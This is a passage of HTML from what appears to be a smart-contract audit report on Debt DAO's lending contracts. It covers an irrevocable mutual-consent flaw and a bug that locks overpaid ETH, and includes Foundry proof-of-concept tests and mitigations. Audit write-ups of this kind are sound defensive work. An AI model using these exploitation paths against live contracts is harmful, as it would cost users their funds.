height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Check that if payment in ETH, then <code>lender == msg.sender</code> in <code>addCredit</code> function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/24\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-02-mutual-consent-cannot-be-revoked-and-stays-valid-forever\" style=\"position:relative;\"><a href=\"#m-02-mutual-consent-cannot-be-revoked-and-stays-valid-forever\" aria-label=\"m 02 mutual consent cannot be revoked and stays valid forever permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/33\">[M-02] Mutual consent cannot be revoked and stays valid forever</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/33\">aphak5010</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/526\">minhquanym</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/503\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/299\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/271\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/61\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/38\">HE1M</a></em></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L11-L68\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L11-L68</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262</a></p>\n<h3 id=\"impact-5\" style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Contracts that inherit from the <code>MutualConsent</code> contract, have access to a <code>mutualConsent</code> modifier.</p>\n<p>Functions that use this modifier need consent from two parties to be called successfully.</p>\n<p>Once one party has given consent for a function call, it cannot revoke consent.</p>\n<p>This means that the other party can call this function at any time now.</p>\n<p>This opens the door for several exploitation paths.</p>\n<p>Most notably though the functions <code>LineOfCredit.setRates()</code>, <code>LineOfCredit.addCredit()</code> and <code>LineOfCredit.increaseCredit()</code> can cause problems.</p>\n<p>One party can use Social Engineering to make the other party consent to multiple function calls and exploit the multiple consents.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>A borrower and lender want to change the rates for a credit.\nThe borrower wants to create the possibility for himself to change the rates in the future without the lender’s consent.</li>\n<li>The borrower and lender agree to set <code>dRate</code> and <code>fRate</code> to 5%.</li>\n<li>The lender calls the <code>LineOfCredit.setRates()</code> function to give his consent.</li>\n<li>The borrower might now say to the lender “Let’s put the rate to 5.1% instead, I will give an extra 0.1%”</li>\n<li>The borrower and lender now both call the <code>LineOfCredit.setRates()</code> function to set the rates to 5.1%.</li>\n<li>The borrower can now set the rates to 5% at any time. E.g. they might increase the rates further in the future (the borrower playing by the rules) and at some point the borrower can decide to set the rates to 5%.</li>\n</ol>\n<p>Links:</p>\n<p><code>MutualConsent</code> contract: <a href=\"https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/MutualConsent.sol\">https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/MutualConsent.sol</a></p>\n<p><code>LineOfCredit.setRates()</code> function: <a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262</a></p>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>There are several options to fix this issue:</p>\n<ol>\n<li>Add a function to the <code>MutualConsent</code> contract to revoke consent for a function call.</li>\n<li>Make consent valid only for a certain amount of time.</li>\n<li>Invalidate existing consents for a function when function is called with different arguments.</li>\n</ol>\n<p>Option 3 requires a lot of additional bookkeeping but is probably the cleanest solution.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/33\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-03-borrowerlender-excessive-eth-not-refunded-and-permanently-locked-in-protocol\" style=\"position:relative;\"><a href=\"#m-03-borrowerlender-excessive-eth-not-refunded-and-permanently-locked-in-protocol\" aria-label=\"m 03 borrowerlender excessive eth not refunded and permanently locked in protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/39\">[M-03] Borrower/Lender excessive ETH not refunded and permanently locked in protocol</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/39\">0xdeadbeef0x</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/528\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/523\">HE1M</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/522\">eierina</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/497\">d3e4</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/466\">lotux</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/463\">berndartmueller</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/459\">RedOneN</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/444\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/431\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/410\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/364\">minhquanym</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/342\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/318\">Ch_301</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/307\">immeas</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/290\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/253\">Tomo</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/213\">ayeslick</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/194\">codexploder</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/182\">eighty</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/181\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/175\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/162\">perseverancesuccess</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/124\">Lambda</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/94\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/84\">Koolex</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/81\">aphak5010</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/56\">Nyx</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/25\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L292\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L292</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L315\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L315</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L223\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L223</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L265\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L265</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L71\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L71</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388</a></p>\n<h3 id=\"impact-6\" style=\"position:relative;\"><a href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The protocol does not refund overpayment of ETH. Excessive ETH is not included in the protocols accounting. As a result, the funds are permanently locked in the protocol <strong>(Loss of funds)</strong>.</p>\n<p>There are multiple scenarios where excessive ETH could be sent by Borrowers and Lenders to the protocol.</p>\n<p>The vulnerability effects at least five different scenarios and locks both the lender and borrowers ETH in LineOfCredit if overpaid. <strong>There is no way to transfer the locked ETH back to the users</strong>, as the withdraw methods are dependent on accounting (which is not updated with locked ETH).</p>\n<p>This vulnerability impacts EscrowedLine, LineOfCredit, SpigotedLine and SecuredLine.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The bug resides in <code>receiveTokenOrETH</code> function when receiving ETH.</p>\n<p>The function does not handle cases where <code>msg.value</code> is larger than <code>amount</code> meaning a refund is needed (<code>msg.value</code> - <code>amount</code>). In such cases, <code>msg.value</code> is added to the balance of LineOfCredit although only <code>amount</code> is used in internal accounting. Thus the excessive ETH  is permanently locked in the contract as the withdraw methods are dependent on the internal accounting.</p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function receiveTokenOrETH(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      address token,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      address sender,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint256 amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      returns (bool)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(token == address(0)) { revert TransferFailed(); }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(token != Denominations.ETH) { // ERC20</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IERC20(token).safeTransferFrom(sender, address(this), amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else { // ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if(msg.value &lt; amount) { revert TransferFailed(); }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>Scenarios where borrowers ETH funds will be locked in LineOfCredit:</p>\n<ol>\n<li>Borrower calls <code>depositAndClose</code> with an ETH value that is above the owed debt.</li>\n<li>Borrower calls <code>depositAndRepay</code> with an ETH value that is above the amount specified in the parameters.</li>\n<li>Borrower calls <code>close</code> with an ETH value that is above the owed fees.</li>\n</ol>\n<p>Scenarios where lenders ETH funds will be locked in LineOfCredit:</p>\n<ol>\n<li>Lender calls <code>addCredit</code> with and ETH value that is greater than the <code>amount</code> parameter.</li>\n<li>Lender calls <code>increaseCredit</code> with and ETH value that is greater than the <code>amount</code> parameter.</li>\n</ol>\n<p>The above scenarios will happen when:</p>\n<ul>\n<li>Excessive ETH is sent with the confidence that it will be refunded (expected). Intentionally or by mistake.</li>\n<li>\n<p>Excessive ETH will be sent (and expected to be refunded) when calling <code>depositeAndClose()</code>, <code>close(id)</code> and <code>depositAndRepay(amount)</code> as they internally update the fees with the <code>_accrue</code> method. The amount changes every second because part of the formula that calculates the fees is based on a multiplication of seconds past the previous calculations. In most cases, the caller will not know the amount of interest that will be accrued and must send excessive ETH to not revert the transaction.</p>\n<ul>\n<li>The formula that calculates interest:</li>\n</ul>\n</li>\n</ul>\n<p><code>InterestAccrued = (rate.dRate * drawnBalance * timespan) / INTEREST_DENOMINATOR + (rate.fRate * (facilityBalance - drawnBalance) * timespan) / INTEREST_DENOMINATOR</code><br>\nWhere <code>timespan</code> is <code>timespan= block.timestamp - rate.lastAccrued</code><br>\n*   Attached link to Debt DAO docs with more information: <a href=\"https://docs.debtdao.finance/faq/accrued-interest-calculation\">https://docs.debtdao.finance/faq/accrued-interest-calculation</a></p>\n<p>The POC includes four of the mentioned scenarios. To run the POC add the below code to the LineOfCredit.t.sol test and execute <code>forge test -v</code>. Expected output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 4 tests for contracts/tests/LineOfCredit.t.sol:LineTest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] test_freeze_eth_addCredit() (gas: 277920)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] test_freeze_eth_depositAndClose() (gas: 280378)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] test_freeze_eth_depositAndRepay() (gas: 302991)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] test_freeze_eth_increaseCredit() (gas: 318830)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: ok. 4 passed; 0 failed; finished in 1.59ms</span></span></code></pre>\n<p>Add the following code to tests:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _addCreditEth(address token, uint256 amount) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.addCredit(dRate, fRate, amount, token, lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.addCredit{value: amount}(dRate, fRate, amount, token, lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function test_freeze_eth_depositAndClose() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount = 1 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // fund lender</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deal(lender, amount*5);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // fund borrower</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deal(borrower, amount*5);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // add credit to line</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _addCreditEth(eth, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //borrow 1 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32 id = line.ids(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.borrow(id, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //depositAndClose full extra funds (amount * 2)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.depositAndClose{value:amount*2}();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //validate funds are stuck</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(address(line).balance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assert(address(line).balance == amount*2 - amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     function test_freeze_eth_depositAndRepay() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount = 1 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // fund lender</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deal(lender, amount*5);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // fund borrower</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deal(borrower, amount*5);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // add credit to line</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _addCreditEth(eth, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //borrow 1 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32 id = line.ids(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.borrow(id, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //depositAndRepay full extra funds (amount * 2)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.depositAndRepay{value:amount*2}(amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Lender calls withdraw </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.withdraw(id, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //validate funds are stuck</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assert(address(line).balance == amount*2 - amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function test_freeze_eth_addCredit() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount = 1 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span 